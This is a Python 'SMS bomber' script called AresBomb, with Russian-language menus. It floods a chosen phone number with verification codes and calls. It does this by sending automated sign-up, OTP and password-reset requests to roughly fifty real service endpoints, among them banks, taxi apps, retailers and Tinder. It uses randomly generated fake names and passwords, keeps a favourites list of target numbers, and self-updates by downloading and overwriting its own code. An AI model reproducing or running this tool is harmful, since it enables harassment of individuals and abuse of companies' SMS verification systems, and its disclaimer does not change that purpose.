import requests, random, datetime, sys, time, argparse, os

version = 1.05
set = [1, 10]
fav_phones = []

if os.path.isfile("config.data") != 1:
	with open('config.data', 'w') as filehandle:  
 	   for listitem in set:
 	   	filehandle.write('%s\n' % listitem)

if os.path.isfile("config.data") == 1:
	set = []
	with open('config.data', 'r') as filehandle:
	 	for line in filehandle:
	 		currentPlace = line[:-1]
	 		set.append(float(currentPlace))

if os.path.isfile("phones.data") != 1:
	with open('phones.data', 'w') as filehandle:  
 	   for listitem in fav_phones:
 	   	filehandle.write('%s\n' % listitem)

if os.path.isfile("phones.data") == 1:
	with open('phones.data', 'r') as filehandle:
	 	for line in filehandle:
	 		currentPlace = line[:-1]
	 		fav_phones.append(currentPlace)

def return_phones():
	global fav_phones, _phone
	print(banner)
	for i in range(int(len(fav_phones)/2)):
		print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
	_phone = fav_phones[int(input("\n"))*2]
	
def save_phones():
	global fav_phones
	while True:
		print(banner)
		for i in range(int(len(fav_phones)/2)):
			print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
		print("\n1 - Добавить номер\n2 - Удалить номер\n0 - Выйти")
		_menu = input()
		if _menu == "0": break
		if _menu == "1":
			fav_phones.append(input("Введите номер: "))
			fav_phones.append(input("Введите метку для номера: "))
		if _menu == "2":
	 		delete_phones = int(input("Введите номер номера, который вы хотите удалить: "))
	 		fav_phones.pop(delete_phones*2)
	 		fav_phones.pop(delete_phones*2)
		with open('phones.data', 'w') as filehandle:
			for listitem in fav_phones:
				filehandle.write('%s\n' % listitem)

def update():
	global version
	print("Проверка обновлений")
	try:
		upd=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/last_version.txt')
		upd_vers = float(upd.text[0:6])
		if upd_vers > version:
			print("Найдено обновление\n" + upd.text[0:6] + "\nИзменения:\n" + upd.text[7:])
			print("\nНачато обновление")
			upd_boom=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/boom.py')
			f = open("boom.py", "wb")
			f.write(upd_boom.content)
			f.close()
			print("\nОбновление завершено, откройте бомбер заново командой\npython boom.py")
			return "exit"
		elif upd_vers == version: print("Установлена последняя версия, вы прекрасны")
		elif upd_vers < version: print("Не хочешь попасть в команду?")
		else: print("Ошибка, файл обновлений не найден")
	except BaseException:
		print("Нет интернета, попробуйте позже")

def send_sms(serv):
	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
	if serv == 0: requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
	elif serv == 1: requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
	elif serv == 2: requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
	elif serv == 3: requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
	elif serv == 4: requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
	elif serv == 5: requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
	elif serv == 6: requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
	elif serv == 7: requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
	elif serv == 8: requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
	elif serv == 9: requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
	elif serv == 10: requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
	elif serv == 11: requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
	elif serv == 12: requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
	elif serv == 13: requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
	elif serv == 14: requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
	elif serv == 15: requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
	elif serv == 16: requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
	elif serv == 17: requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
	elif serv == 18: requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
	elif serv == 19: requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
	elif serv == 20: requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
	elif serv == 21: requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
	elif serv == 22: requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
	elif serv == 23: requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
	elif serv == 24: requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
	elif serv == 25: requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
	elif serv == 26: requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
	elif serv == 27: requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
	elif serv == 28: requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
	elif serv == 29: requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
	elif serv == 30: requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
	elif serv == 31: requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
	elif serv == 32: requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
	elif serv == 33: requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
	elif serv == 34: requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
	elif serv == 35: requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
	elif serv == 36: requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
	elif serv == 37: requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
	elif serv == 38: requests.post('https://plink.tech/register/',json={"phone": _phone})
	elif serv == 39: requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
	elif serv == 40: requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
	elif serv == 41: requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
	elif serv == 42: requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
	elif serv == 43: requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
	elif serv == 44: requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
	elif serv == 45: requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
	elif serv == 46: requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
	elif serv == 47: requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
	elif serv == 48: requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
	elif serv == 49: requests.post('https://b.utair.ru/api/v1/login/', data = {'login': _phone, }, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
	else: print("Ошибка сервиса")

def send_call(serv):
	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
	if serv == 0: requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
	else: print("Ошибка сервиса")

def bomb():
	global set, _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
	_count_finish = 0
	print(banner)
	_phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
	if _phone == "1": return_phones()
	try:
		_count = int(input('Количество сообщений: (100 по умолчанию)'))
	except:
		_count = 100
		
	try:
		_timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
	except:
		_timer = 0
		
	if _phone[0] == '+': _phone = _phone[1:]
	if _phone[0] == '8': _phone = '7'+_phone[1:]
	if _phone[0] == '9': _phone = '7'+_phone
		
	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		
	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		
	_email = _name+'@gmail.com'
	email = _name+'@gmail.com'
	
	def screen():
		print(banner)
		print("\nДля остановки немедленной нажмите Ctrl+Z\n")
		print('Номер: '+ _phone+ '\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
	
	while _count_finish != _count:
		randsh = random.randint(1,100)
		if set[1] > randsh:
			_service_call = random.randint(0,0)
			try:
				send_call(_service_call)
				screen()
				print("Сервис звонок " + str(_service_call) + " отправлен")
				_count_finish += 1
			except:
				screen()
				print("!!! Сервис звонок " + str(_service_call) + " не отправлен")
		else:
			_service_sms = random.randint(0, 48)
			try:
				send_sms(_service_sms)
				screen()
				print("Сервис смс " + str(_service_sms) + " отправлен")
				_count_finish += 1
			except:
				screen()
				print("!!! Сервис смс " + str(_service_sms) + " не отправлен")
		time.sleep(_timer)
	print(banner+'\nРезультат:\n\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
	if set[0] == 1.0: exit()
	else: input("Бомбинг завершён, нажмите ENTER для выхода в главное меню")

def settings():
	global set
	while True:
		print(banner)
		print("\n1 - Выходить из программы поле бомбинга: " + str(set[0]))
		print("2 - Вероятность бомбинга звонками: " + str(set[1])+"%")
		print("\n0 - Выход из этого меню и сохранение")
		menu = input()
		if menu == "0":
			with open('config.data', 'w') as filehandle:  
 			   for listitem in set:
 	  		 	filehandle.write('%s\n' % listitem)
			break
		elif menu == "1":
			if set[0] == 1: set[0] = 0
			elif set[0] == 0: set[0] = 1
		elif menu == "2":
			print(banner)
			set[1] = float(input("\nВведите шанс звонка: "))

def info():
	global banner, version
	print(banner+"\nВерсия "+str(version)+"\n\nБомбер создан только для развлекательных целей. За все действия что вы с ним проводите отвечаете только вы\n\nСоздатель оригинального бомбера telete.in/mossadx\nЕго канал telete.in/codingbots\n\nСоздатель данной модификации telete.in/MaksPV\n\nНажмите ENTER чтобы выйти")
	input()

if update() == "exit": exit()
time.sleep(1)

while True:
	banner = ("\n" * 100)+ """
     _                        
    / \   _ __ ___  ___       
   / _ \ | '__/ _ \/ __|      
  / ___ \| | |  __/\__ \      
 /_/   \_\_|  \___||___/      
  ____                  _     
 | __ )  ___  _ __ ___ | |__  
 |  _ \ / _ \| '_ ` _ \| '_ \ 
 | |_) | (_) | | | | | | |_) |
 |____/ \___/|_| |_| |_|_.__/ 

 telegram channel: @AresBomb                         
	"""
	print(banner)
	menu = input("1 - Начать бомбинг\n2 - Настройки бомбера\n3 - Номера в избранном\n4 - Информация о бомбере\n\n0 - Выход\n")
	if menu == "0": exit()
	if menu == "1": bomb()
	if menu == "2": settings()
	if menu == "3": save_phones()
	if menu == "4": info()
